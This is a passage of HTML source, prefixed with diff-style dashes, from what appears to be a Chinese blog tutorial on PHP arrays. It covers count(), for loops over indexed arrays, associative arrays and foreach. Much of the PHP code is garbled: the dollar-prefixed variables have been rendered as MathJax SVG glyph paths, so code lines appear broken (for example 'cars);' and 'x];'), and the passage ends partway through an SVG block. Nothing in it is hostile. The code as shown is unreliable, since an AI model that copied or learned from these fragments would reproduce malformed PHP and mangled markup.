-<path stroke-width="1" id="E1-MJMAIN-2E" d="M78 60Q78 84 95 102T138 120Q162 120 180 104T199 61Q199 36 182 18T139 0T96 17T78 60Z"></path>
-<path stroke-width="1" id="E1-MJMAIN-22" d="M34 634Q34 659 50 676T93 694Q121 694 144 668T168 579Q168 525 146 476T101 403T73 379Q69 379 60 388T50 401Q50 404 62 417T88 448T116 500T131 572Q131 584 130 584T125 581T112 576T94 573Q69 573 52 590T34 634ZM238 634Q238 659 254 676T297 694Q325 694 348 668T372 579Q372 525 350 476T305 403T277 379Q273 379 264 388T254 401Q254 404 266 417T292 448T320 500T335 572Q335 584 334 584T329 581T316 576T298 573Q273 573 256 590T238 634Z"></path>
-<path stroke-width="1" id="E1-MJMAIN-2C" d="M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z"></path>
-</defs>
-<g stroke="currentColor" fill="currentColor" stroke-width="0" transform="matrix(1 0 0 -1 0 0)" aria-hidden="true">
- <use xlink:href="#E1-MJMATHI-63" x="0" y="0"></use>
- <use xlink:href="#E1-MJMATHI-61" x="433" y="0"></use>
- <use xlink:href="#E1-MJMATHI-72" x="963" y="0"></use>
- <use xlink:href="#E1-MJMATHI-73" x="1414" y="0"></use>
- <use xlink:href="#E1-MJMAIN-5B" x="1884" y="0"></use>
- <use xlink:href="#E1-MJMAIN-30" x="2162" y="0"></use>
- <use xlink:href="#E1-MJMAIN-5D" x="2663" y="0"></use>
- <use xlink:href="#E1-MJMAIN-2E" x="2941" y="0"></use>
- <use xlink:href="#E1-MJMAIN-22" x="3386" y="0"></use>
- <use xlink:href="#E1-MJMAIN-2C" x="3887" y="0"></use>
- <use xlink:href="#E1-MJMAIN-22" x="4332" y="0"></use>
- <use xlink:href="#E1-MJMAIN-2E" x="4832" y="0"></use>
-</g>
-</svg>cars[1] . &quot;,&quot; . $cars[2] . &quot;.&quot;;<br></code></pre></td></tr></table></figure>
-<p><img  src="https://img-blog.csdnimg.cn/20210307191305394.png"  ><span class="image-caption">在这里插入图片描述</span><br><strong>获取数组的长度 - count() 函数</strong><br>count() 函数用于返回数组的长度（元素的数量）：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">echo count($cars);<br></code></pre></td></tr></table></figure>
-<p><img  src="https://img-blog.csdnimg.cn/20210307191510646.png"  ><span class="image-caption">在这里插入图片描述</span><br>长度为3</p>
-<p><strong>遍历数值数组</strong><br>遍历并打印数值数组中的所有值，您可以使用 for 循环，如下所示：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs plain"><svg xmlns:xlink="http://www.w3.org/1999/xlink" width="19.495ex" height="2.843ex" style="vertical-align: -0.838ex;" viewBox="0 -863.1 8393.6 1223.9" role="img" focusable="false" xmlns="http://www.w3.org/2000/svg" aria-labelledby="MathJax-SVG-1-Title">
-<title id="MathJax-SVG-1-Title">arrlength=count(</title>
-<defs aria-hidden="true">
-<path stroke-width="1" id="E1-MJMATHI-61" d="M33 157Q33 258 109 349T280 441Q331 441 370 392Q386 422 416 422Q429 422 439 414T449 394Q449 381 412 234T374 68Q374 43 381 35T402 26Q411 27 422 35Q443 55 463 131Q469 151 473 152Q475 153 483 153H487Q506 153 506 144Q506 138 501 117T481 63T449 13Q436 0 417 -8Q409 -10 393 -10Q359 -10 336 5T306 36L300 51Q299 52 296 50Q294 48 292 46Q233 -10 172 -10Q117 -10 75 30T33 157ZM351 328Q351 334 346 350T323 385T277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q217 26 254 59T298 110Q300 114 325 217T351 328Z"></path>
-<path stroke-width="1" id="E1-MJMATHI-72" d="M21 287Q22 290 23 295T28 317T38 348T53 381T73 411T99 433T132 442Q161 442 183 430T214 408T225 388Q227 382 228 382T236 389Q284 441 347 441H350Q398 441 422 400Q430 381 430 363Q430 333 417 315T391 292T366 288Q346 288 334 299T322 328Q322 376 378 392Q356 405 342 405Q286 405 239 331Q229 315 224 298T190 165Q156 25 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 114 189T154 366Q154 405 128 405Q107 405 92 377T68 316T57 280Q55 278 41 278H27Q21 284 21 287Z"></path>
-<path stroke-width="1" id="E1-MJMATHI-6C" d="M117 59Q117 26 142 26Q179 26 205 131Q211 151 215 152Q217 153 225 153H229Q238 153 241 153T246 151T248 144Q247 138 245 128T234 90T214 43T183 6T137 -11Q101 -11 70 11T38 85Q38 97 39 102L104 360Q167 615 167 623Q167 626 166 628T162 632T157 634T149 635T141 636T132 637T122 637Q112 637 109 637T101 638T95 641T94 647Q94 649 96 661Q101 680 107 682T179 688Q194 689 213 690T243 693T254 694Q266 694 266 686Q266 675 193 386T118 83Q118 81 118 75T117 65V59Z"></path>
-<path stroke-width="1" id="E1-MJMATHI-65" d="M39 168Q39 225 58 272T107 350T174 402T244 433T307 442H310Q355 442 388 420T421 355Q421 265 310 237Q261 224 176 223Q139 223 138 221Q138 219 132 186T125 128Q125 81 146 54T209 26T302 45T394 111Q403 121 406 121Q410 121 419 112T429 98T420 82T390 55T344 24T281 -1T205 -11Q126 -11 83 42T39 168ZM373 353Q367 405 305 405Q272 405 244 391T199 357T170 316T154 280T149 261Q149 260 169 260Q282 260 327 284T373 353Z"></path>
-<path stroke-width="1" id="E1-MJMATHI-6E" d="M21 287Q22 293 24 303T36 341T56 388T89 425T135 442Q171 442 195 424T225 390T231 369Q231 367 232 367L243 378Q304 442 382 442Q436 442 469 415T503 336T465 179T427 52Q427 26 444 26Q450 26 453 27Q482 32 505 65T540 145Q542 153 560 153Q580 153 580 145Q580 144 576 130Q568 101 554 73T508 17T439 -10Q392 -10 371 17T350 73Q350 92 386 193T423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 180T152 343Q153 348 153 366Q153 405 129 405Q91 405 66 305Q60 285 60 284Q58 278 41 278H27Q21 284 21 287Z"></path>
-<path stroke-width="1" id="E1-MJMATHI-67" d="M311 43Q296 30 267 15T206 0Q143 0 105 45T66 160Q66 265 143 353T314 442Q361 442 401 394L404 398Q406 401 409 404T418 412T431 419T447 422Q461 422 470 413T480 394Q480 379 423 152T363 -80Q345 -134 286 -169T151 -205Q10 -205 10 -137Q10 -111 28 -91T74 -71Q89 -71 102 -80T116 -111Q116 -121 114 -130T107 -144T99 -154T92 -162L90 -164H91Q101 -167 151 -167Q189 -167 211 -155Q234 -144 254 -122T282 -75Q288 -56 298 -13Q311 35 311 43ZM384 328L380 339Q377 350 375 354T369 368T359 382T346 393T328 402T306 405Q262 405 221 352Q191 313 171 233T151 117Q151 38 213 38Q269 38 323 108L331 118L384 328Z"></path>
-<path stroke-width="1" id="E1-MJMATHI-74" d="M26 385Q19 392 19 395Q19 399 22 411T27 425Q29 430 36 430T87 431H140L159 511Q162 522 166 540T173 566T179 586T187 603T197 615T211 624T229 626Q247 625 254 615T261 596Q261 589 252 549T232 470L222 433Q222 431 272 431H323Q330 424 330 420Q330 398 317 385H210L174 240Q135 80 135 68Q135 26 162 26Q197 26 230 60T283 144Q285 150 288 151T303 153H307Q322 153 322 145Q322 142 319 133Q314 117 301 95T267 48T216 6T155 -11Q125 -11 98 4T59 56Q57 64 57 83V101L92 241Q127 382 128 383Q128 385 77 385H26Z"></path>
-<path stroke-width="1" id="E1-MJMATHI-68" d="M137 683Q138 683 209 688T282 694Q294 694 294 685Q294 674 258 534Q220 386 220 383Q220 381 227 388Q288 442 357 442Q411 442 444 415T478 336Q478 285 440 178T402 50Q403 36 407 31T422 26Q450 26 474 56T513 138Q516 149 519 151T535 153Q555 153 555 145Q555 144 551 130Q535 71 500 33Q466 -10 419 -10H414Q367 -10 346 17T325 74Q325 90 361 192T398 345Q398 404 354 404H349Q266 404 205 306L198 293L164 158Q132 28 127 16Q114 -11 83 -11Q69 -11 59 -2T48 16Q48 30 121 320L195 616Q195 629 188 632T149 637H128Q122 643 122 645T124 664Q129 683 137 683Z"></path>
-<path stroke-width="1" id="E1-MJMAIN-3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path>
-<path stroke-width="1" id="E1-MJMATHI-63" d="M34 159Q34 268 120 355T306 442Q362 442 394 418T427 355Q427 326 408 306T360 285Q341 285 330 295T319 325T330 359T352 380T366 386H367Q367 388 361 392T340 400T306 404Q276 404 249 390Q228 381 206 359Q162 315 142 235T121 119Q121 73 147 50Q169 26 205 26H209Q321 26 394 111Q403 121 406 121Q410 121 419 112T429 98T420 83T391 55T346 25T282 0T202 -11Q127 -11 81 37T34 159Z"></path>
-<path stroke-width="1" id="E1-MJMATHI-6F" d="M201 -11Q126 -11 80 38T34 156Q34 221 64 279T146 380Q222 441 301 441Q333 441 341 440Q354 437 367 433T402 417T438 387T464 338T476 268Q476 161 390 75T201 -11ZM121 120Q121 70 147 48T206 26Q250 26 289 58T351 142Q360 163 374 216T388 308Q388 352 370 375Q346 405 306 405Q243 405 195 347Q158 303 140 230T121 120Z"></path>
-<path stroke-width="1" id="E1-MJMATHI-75" d="M21 287Q21 295 30 318T55 370T99 420T158 442Q204 442 227 417T250 358Q250 340 216 246T182 105Q182 62 196 45T238 27T291 44T328 78L339 95Q341 99 377 247Q407 367 413 387T427 416Q444 431 463 431Q480 431 488 421T496 402L420 84Q419 79 419 68Q419 43 426 35T447 26Q469 29 482 57T512 145Q514 153 532 153Q551 153 551 144Q550 139 549 130T540 98T523 55T498 17T462 -8Q454 -10 438 -10Q372 -10 347 46Q345 45 336 36T318 21T296 6T267 -6T233 -11Q189 -11 155 7Q103 38 103 113Q103 170 138 262T173 379Q173 380 173 381Q173 390 173 393T169 400T158 404H154Q131 404 112 385T82 344T65 302T57 280Q55 278 41 278H27Q21 284 21 287Z"></path>
-<path stroke-width="1" id="E1-MJMAIN-28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path>
-</defs>
-<g stroke="currentColor" fill="currentColor" stroke-width="0" transform="matrix(1 0 0 -1 0 0)" aria-hidden="true">
- <use xlink:href="#E1-MJMATHI-61" x="0" y="0"></use>
- <use xlink:href="#E1-MJMATHI-72" x="529" y="0"></use>
- <use xlink:href="#E1-MJMATHI-72" x="981" y="0"></use>
- <use xlink:href="#E1-MJMATHI-6C" x="1432" y="0"></use>
- <use xlink:href="#E1-MJMATHI-65" x="1731" y="0"></use>
- <use xlink:href="#E1-MJMATHI-6E" x="2197" y="0"></use>
- <use xlink:href="#E1-MJMATHI-67" x="2798" y="0"></use>
- <use xlink:href="#E1-MJMATHI-74" x="3278" y="0"></use>
- <use xlink:href="#E1-MJMATHI-68" x="3640" y="0"></use>
- <use xlink:href="#E1-MJMAIN-3D" x="4494" y="0"></use>
- <use xlink:href="#E1-MJMATHI-63" x="5550" y="0"></use>
- <use xlink:href="#E1-MJMATHI-6F" x="5984" y="0"></use>
- <use xlink:href="#E1-MJMATHI-75" x="6469" y="0"></use>
- <use xlink:href="#E1-MJMATHI-6E" x="7042" y="0"></use>
- <use xlink:href="#E1-MJMATHI-74" x="7642" y="0"></use>
- <use xlink:href="#E1-MJMAIN-28" x="8004" y="0"></use>
-</g>
-</svg>cars);<br><br>for(<svg xmlns:xlink="http://www.w3.org/1999/xlink" width="6.237ex" height="2.509ex" style="vertical-align: -0.671ex;" viewBox="0 -791.3 2685.6 1080.4" role="img" focusable="false" xmlns="http://www.w3.org/2000/svg" aria-labelledby="MathJax-SVG-1-Title">
-<title id="MathJax-SVG-1-Title">x=0;</title>
-<defs aria-hidden="true">
-<path stroke-width="1" id="E1-MJMATHI-78" d="M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z"></path>
-<path stroke-width="1" id="E1-MJMAIN-3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path>
-<path stroke-width="1" id="E1-MJMAIN-30" d="M96 585Q152 666 249 666Q297 666 345 640T423 548Q460 465 460 320Q460 165 417 83Q397 41 362 16T301 -15T250 -22Q224 -22 198 -16T137 16T82 83Q39 165 39 320Q39 494 96 585ZM321 597Q291 629 250 629Q208 629 178 597Q153 571 145 525T137 333Q137 175 145 125T181 46Q209 16 250 16Q290 16 318 46Q347 76 354 130T362 333Q362 478 354 524T321 597Z"></path>
-<path stroke-width="1" id="E1-MJMAIN-3B" d="M78 370Q78 394 95 412T138 430Q162 430 180 414T199 371Q199 346 182 328T139 310T96 327T78 370ZM78 60Q78 85 94 103T137 121Q202 121 202 8Q202 -44 183 -94T144 -169T118 -194Q115 -194 106 -186T95 -174Q94 -171 107 -155T137 -107T160 -38Q161 -32 162 -22T165 -4T165 4Q165 5 161 4T142 0Q110 0 94 18T78 60Z"></path>
-</defs>
-<g stroke="currentColor" fill="currentColor" stroke-width="0" transform="matrix(1 0 0 -1 0 0)" aria-hidden="true">
- <use xlink:href="#E1-MJMATHI-78" x="0" y="0"></use>
- <use xlink:href="#E1-MJMAIN-3D" x="850" y="0"></use>
- <use xlink:href="#E1-MJMAIN-30" x="1906" y="0"></use>
- <use xlink:href="#E1-MJMAIN-3B" x="2407" y="0"></use>
-</g>
-</svg>x&lt;<svg xmlns:xlink="http://www.w3.org/1999/xlink" width="10.44ex" height="2.509ex" style="vertical-align: -0.671ex;" viewBox="0 -791.3 4495 1080.4" role="img" focusable="false" xmlns="http://www.w3.org/2000/svg" aria-labelledby="MathJax-SVG-1-Title">
-<title id="MathJax-SVG-1-Title">arrlength;</title>
-<defs aria-hidden="true">
-<path stroke-width="1" id="E1-MJMATHI-61" d="M33 157Q33 258 109 349T280 441Q331 441 370 392Q386 422 416 422Q429 422 439 414T449 394Q449 381 412 234T374 68Q374 43 381 35T402 26Q411 27 422 35Q443 55 463 131Q469 151 473 152Q475 153 483 153H487Q506 153 506 144Q506 138 501 117T481 63T449 13Q436 0 417 -8Q409 -10 393 -10Q359 -10 336 5T306 36L300 51Q299 52 296 50Q294 48 292 46Q233 -10 172 -10Q117 -10 75 30T33 157ZM351 328Q351 334 346 350T323 385T277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q217 26 254 59T298 110Q300 114 325 217T351 328Z"></path>
-<path stroke-width="1" id="E1-MJMATHI-72" d="M21 287Q22 290 23 295T28 317T38 348T53 381T73 411T99 433T132 442Q161 442 183 430T214 408T225 388Q227 382 228 382T236 389Q284 441 347 441H350Q398 441 422 400Q430 381 430 363Q430 333 417 315T391 292T366 288Q346 288 334 299T322 328Q322 376 378 392Q356 405 342 405Q286 405 239 331Q229 315 224 298T190 165Q156 25 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 114 189T154 366Q154 405 128 405Q107 405 92 377T68 316T57 280Q55 278 41 278H27Q21 284 21 287Z"></path>
-<path stroke-width="1" id="E1-MJMATHI-6C" d="M117 59Q117 26 142 26Q179 26 205 131Q211 151 215 152Q217 153 225 153H229Q238 153 241 153T246 151T248 144Q247 138 245 128T234 90T214 43T183 6T137 -11Q101 -11 70 11T38 85Q38 97 39 102L104 360Q167 615 167 623Q167 626 166 628T162 632T157 634T149 635T141 636T132 637T122 637Q112 637 109 637T101 638T95 641T94 647Q94 649 96 661Q101 680 107 682T179 688Q194 689 213 690T243 693T254 694Q266 694 266 686Q266 675 193 386T118 83Q118 81 118 75T117 65V59Z"></path>
-<path stroke-width="1" id="E1-MJMATHI-65" d="M39 168Q39 225 58 272T107 350T174 402T244 433T307 442H310Q355 442 388 420T421 355Q421 265 310 237Q261 224 176 223Q139 223 138 221Q138 219 132 186T125 128Q125 81 146 54T209 26T302 45T394 111Q403 121 406 121Q410 121 419 112T429 98T420 82T390 55T344 24T281 -1T205 -11Q126 -11 83 42T39 168ZM373 353Q367 405 305 405Q272 405 244 391T199 357T170 316T154 280T149 261Q149 260 169 260Q282 260 327 284T373 353Z"></path>
-<path stroke-width="1" id="E1-MJMATHI-6E" d="M21 287Q22 293 24 303T36 341T56 388T89 425T135 442Q171 442 195 424T225 390T231 369Q231 367 232 367L243 378Q304 442 382 442Q436 442 469 415T503 336T465 179T427 52Q427 26 444 26Q450 26 453 27Q482 32 505 65T540 145Q542 153 560 153Q580 153 580 145Q580 144 576 130Q568 101 554 73T508 17T439 -10Q392 -10 371 17T350 73Q350 92 386 193T423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 180T152 343Q153 348 153 366Q153 405 129 405Q91 405 66 305Q60 285 60 284Q58 278 41 278H27Q21 284 21 287Z"></path>
-<path stroke-width="1" id="E1-MJMATHI-67" d="M311 43Q296 30 267 15T206 0Q143 0 105 45T66 160Q66 265 143 353T314 442Q361 442 401 394L404 398Q406 401 409 404T418 412T431 419T447 422Q461 422 470 413T480 394Q480 379 423 152T363 -80Q345 -134 286 -169T151 -205Q10 -205 10 -137Q10 -111 28 -91T74 -71Q89 -71 102 -80T116 -111Q116 -121 114 -130T107 -144T99 -154T92 -162L90 -164H91Q101 -167 151 -167Q189 -167 211 -155Q234 -144 254 -122T282 -75Q288 -56 298 -13Q311 35 311 43ZM384 328L380 339Q377 350 375 354T369 368T359 382T346 393T328 402T306 405Q262 405 221 352Q191 313 171 233T151 117Q151 38 213 38Q269 38 323 108L331 118L384 328Z"></path>
-<path stroke-width="1" id="E1-MJMATHI-74" d="M26 385Q19 392 19 395Q19 399 22 411T27 425Q29 430 36 430T87 431H140L159 511Q162 522 166 540T173 566T179 586T187 603T197 615T211 624T229 626Q247 625 254 615T261 596Q261 589 252 549T232 470L222 433Q222 431 272 431H323Q330 424 330 420Q330 398 317 385H210L174 240Q135 80 135 68Q135 26 162 26Q197 26 230 60T283 144Q285 150 288 151T303 153H307Q322 153 322 145Q322 142 319 133Q314 117 301 95T267 48T216 6T155 -11Q125 -11 98 4T59 56Q57 64 57 83V101L92 241Q127 382 128 383Q128 385 77 385H26Z"></path>
-<path stroke-width="1" id="E1-MJMATHI-68" d="M137 683Q138 683 209 688T282 694Q294 694 294 685Q294 674 258 534Q220 386 220 383Q220 381 227 388Q288 442 357 442Q411 442 444 415T478 336Q478 285 440 178T402 50Q403 36 407 31T422 26Q450 26 474 56T513 138Q516 149 519 151T535 153Q555 153 555 145Q555 144 551 130Q535 71 500 33Q466 -10 419 -10H414Q367 -10 346 17T325 74Q325 90 361 192T398 345Q398 404 354 404H349Q266 404 205 306L198 293L164 158Q132 28 127 16Q114 -11 83 -11Q69 -11 59 -2T48 16Q48 30 121 320L195 616Q195 629 188 632T149 637H128Q122 643 122 645T124 664Q129 683 137 683Z"></path>
-<path stroke-width="1" id="E1-MJMAIN-3B" d="M78 370Q78 394 95 412T138 430Q162 430 180 414T199 371Q199 346 182 328T139 310T96 327T78 370ZM78 60Q78 85 94 103T137 121Q202 121 202 8Q202 -44 183 -94T144 -169T118 -194Q115 -194 106 -186T95 -174Q94 -171 107 -155T137 -107T160 -38Q161 -32 162 -22T165 -4T165 4Q165 5 161 4T142 0Q110 0 94 18T78 60Z"></path>
-</defs>
-<g stroke="currentColor" fill="currentColor" stroke-width="0" transform="matrix(1 0 0 -1 0 0)" aria-hidden="true">
- <use xlink:href="#E1-MJMATHI-61" x="0" y="0"></use>
- <use xlink:href="#E1-MJMATHI-72" x="529" y="0"></use>
- <use xlink:href="#E1-MJMATHI-72" x="981" y="0"></use>
- <use xlink:href="#E1-MJMATHI-6C" x="1432" y="0"></use>
- <use xlink:href="#E1-MJMATHI-65" x="1731" y="0"></use>
- <use xlink:href="#E1-MJMATHI-6E" x="2197" y="0"></use>
- <use xlink:href="#E1-MJMATHI-67" x="2798" y="0"></use>
- <use xlink:href="#E1-MJMATHI-74" x="3278" y="0"></use>
- <use xlink:href="#E1-MJMATHI-68" x="3640" y="0"></use>
- <use xlink:href="#E1-MJMAIN-3B" x="4216" y="0"></use>
-</g>
-</svg>x++)<br>&#123;<br>	echo <svg xmlns:xlink="http://www.w3.org/1999/xlink" width="5.023ex" height="2.843ex" style="vertical-align: -0.838ex;" viewBox="0 -863.1 2162.5 1223.9" role="img" focusable="false" xmlns="http://www.w3.org/2000/svg" aria-labelledby="MathJax-SVG-1-Title">
-<title id="MathJax-SVG-1-Title">cars[</title>
-<defs aria-hidden="true">
-<path stroke-width="1" id="E1-MJMATHI-63" d="M34 159Q34 268 120 355T306 442Q362 442 394 418T427 355Q427 326 408 306T360 285Q341 285 330 295T319 325T330 359T352 380T366 386H367Q367 388 361 392T340 400T306 404Q276 404 249 390Q228 381 206 359Q162 315 142 235T121 119Q121 73 147 50Q169 26 205 26H209Q321 26 394 111Q403 121 406 121Q410 121 419 112T429 98T420 83T391 55T346 25T282 0T202 -11Q127 -11 81 37T34 159Z"></path>
-<path stroke-width="1" id="E1-MJMATHI-61" d="M33 157Q33 258 109 349T280 441Q331 441 370 392Q386 422 416 422Q429 422 439 414T449 394Q449 381 412 234T374 68Q374 43 381 35T402 26Q411 27 422 35Q443 55 463 131Q469 151 473 152Q475 153 483 153H487Q506 153 506 144Q506 138 501 117T481 63T449 13Q436 0 417 -8Q409 -10 393 -10Q359 -10 336 5T306 36L300 51Q299 52 296 50Q294 48 292 46Q233 -10 172 -10Q117 -10 75 30T33 157ZM351 328Q351 334 346 350T323 385T277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q217 26 254 59T298 110Q300 114 325 217T351 328Z"></path>
-<path stroke-width="1" id="E1-MJMATHI-72" d="M21 287Q22 290 23 295T28 317T38 348T53 381T73 411T99 433T132 442Q161 442 183 430T214 408T225 388Q227 382 228 382T236 389Q284 441 347 441H350Q398 441 422 400Q430 381 430 363Q430 333 417 315T391 292T366 288Q346 288 334 299T322 328Q322 376 378 392Q356 405 342 405Q286 405 239 331Q229 315 224 298T190 165Q156 25 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 114 189T154 366Q154 405 128 405Q107 405 92 377T68 316T57 280Q55 278 41 278H27Q21 284 21 287Z"></path>
-<path stroke-width="1" id="E1-MJMATHI-73" d="M131 289Q131 321 147 354T203 415T300 442Q362 442 390 415T419 355Q419 323 402 308T364 292Q351 292 340 300T328 326Q328 342 337 354T354 372T367 378Q368 378 368 379Q368 382 361 388T336 399T297 405Q249 405 227 379T204 326Q204 301 223 291T278 274T330 259Q396 230 396 163Q396 135 385 107T352 51T289 7T195 -10Q118 -10 86 19T53 87Q53 126 74 143T118 160Q133 160 146 151T160 120Q160 94 142 76T111 58Q109 57 108 57T107 55Q108 52 115 47T146 34T201 27Q237 27 263 38T301 66T318 97T323 122Q323 150 302 164T254 181T195 196T148 231Q131 256 131 289Z"></path>
-<path stroke-width="1" id="E1-MJMAIN-5B" d="M118 -250V750H255V710H158V-210H255V-250H118Z"></path>
-</defs>
-<g stroke="currentColor" fill="currentColor" stroke-width="0" transform="matrix(1 0 0 -1 0 0)" aria-hidden="true">
- <use xlink:href="#E1-MJMATHI-63" x="0" y="0"></use>
- <use xlink:href="#E1-MJMATHI-61" x="433" y="0"></use>
- <use xlink:href="#E1-MJMATHI-72" x="963" y="0"></use>
- <use xlink:href="#E1-MJMATHI-73" x="1414" y="0"></use>
- <use xlink:href="#E1-MJMAIN-5B" x="1884" y="0"></use>
-</g>
-</svg>x];<br>	echo &quot;&lt;br&gt;&quot;;<br>&#125;<br></code></pre></td></tr></table></figure>
-<p><img  src="https://img-blog.csdnimg.cn/20210307192004713.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70"  ><span class="image-caption">在这里插入图片描述</span><br>复现了哦！</p>
-<p><strong>关联数组</strong><br>关联数组是使用您分配给数组的指定的键的数组。<br>这里有两种创建的方法：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">$age&#x3D;array(&quot;Peter&quot;&#x3D;&gt;&quot;35&quot;,&quot;Ben&quot;&#x3D;&gt;&quot;37&quot;,&quot;Joe&quot;&#x3D;&gt;&quot;43&quot;);<br></code></pre></td></tr></table></figure>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs plain">$age[&#39;Peter&#39;]&#x3D;&quot;35&quot;;<br>$age[&#39;Ben&#39;]&#x3D;&quot;37&quot;;<br>$age[&#39;Joe&#39;]&#x3D;&quot;43&quot;;<br></code></pre></td></tr></table></figure>
-<p><img  src="https://img-blog.csdnimg.cn/20210307194109119.png"  ><span class="image-caption">在这里插入图片描述</span><br><strong>遍历关联数组</strong><br>遍历并打印关联数组中的所有值，您可以使用 foreach 循环，如下所示：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs plain">foreach (<svg xmlns:xlink="http://www.w3.org/1999/xlink" width="5.75ex" height="2.009ex" style="vertical-align: -0.671ex;" viewBox="0 -576.1 2475.5 865.1" role="img" focusable="false" xmlns="http://www.w3.org/2000/svg" aria-labelledby="MathJax-SVG-1-Title">
-<title id="MathJax-SVG-1-Title">age as </title>
-<defs aria-hidden="true">
-<path stroke-width="1" id="E1-MJMATHI-61" d="M33 157Q33 258 109 349T280 441Q331 441 370 392Q386 422 416 422Q429 422 439 414T449 394Q449 381 412 234T374 68Q374 43 381 35T402 26Q411 27 422 35Q443 55 463 131Q469 151 473 152Q475 153 483 153H487Q506 153 506 144Q506 138 501 117T481 63T449 13Q436 0 417 -8Q409 -10 393 -10Q359 -10 336 5T306 36L300 51Q299 52 296 50Q294 48 292 46Q233 -10 172 -10Q117 -10 75 30T33 157ZM351 328Q351 334 346 350T323 385T277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q217 26 254 59T298 110Q300 114 325 217T351 328Z"></path>
-<path stroke-width="1" id="E1-MJMATHI-67" d="M311 43Q296 30 267 15T206 0Q143 0 105 45T66 160Q66 265 143 353T314 442Q361 442 401 394L404 398Q406 401 409 404T418 412T431 419T447 422Q461 422 470 413T480 394Q480 379 423 152T363 -80Q345 -134 286 -169T151 -205Q10 -205 10 -137Q10 -111 28 -91T74 -71Q89 -71 102 -80T116 -111Q116 -121 114 -130T107 -144T99 -154T92 -162L90 -164H91Q101 -167 151 -167Q189 -167 211 -155Q234 -144 254 -122T282 -75Q288 -56 298 -13Q311 35 311 43ZM384 328L380 339Q377 350 375 354T369 368T359 382T346 393T328 402T306 405Q262 405 221 352Q191 313 171 233T151 117Q151 38 213 38Q269 38 323 108L331 118L384 328Z"></path>
-<path stroke-width="1" id="E1-MJMATHI-65" d="M39 168Q39 225 58 272T107 350T174 402T244 433T307 442H310Q355 442 388 420T421 355Q421 265 310 237Q261 224 176 223Q139 223 138 221Q138 219 132 186T125 128Q125 81 146 54T209 26T302 45T394 111Q403 121 406 121Q410 121 419 112T429 98T420 82T390 55T344 24T281 -1T205 -11Q126 -11 83 42T39 168ZM373 353Q367 405 305 405Q272 405 244 391T199 357T170 316T154 280T149 261Q149 260 169 260Q282 260 327 284T373 353Z"></path>
-<path stroke-width="1" id="E1-MJMATHI-73" d="M131 289Q131 321 147 354T203 415T300 442Q362 442 390 415T419 355Q419 323 402 308T364 292Q351 292 340 300T328 326Q328 342 337 354T354 372T367 378Q368 378 368 379Q368 382 361 388T336 399T297 405Q249 405 227 379T204 326Q204 301 223 291T278 274T330 259Q396 230 396 163Q396 135 385 107T352 51T289 7T195 -10Q118 -10 86 19T53 87Q53 126 74 143T118 160Q133 160 146 151T160 120Q160 94 142 76T111 58Q109 57 108 57T107 55Q108 52 115 47T146 34T201 27Q237 27 263 38T301 66T318 97T323 122Q323 150 302 164T254 181T195 196T148 231Q131 256 131 289Z"></path>
-</defs>
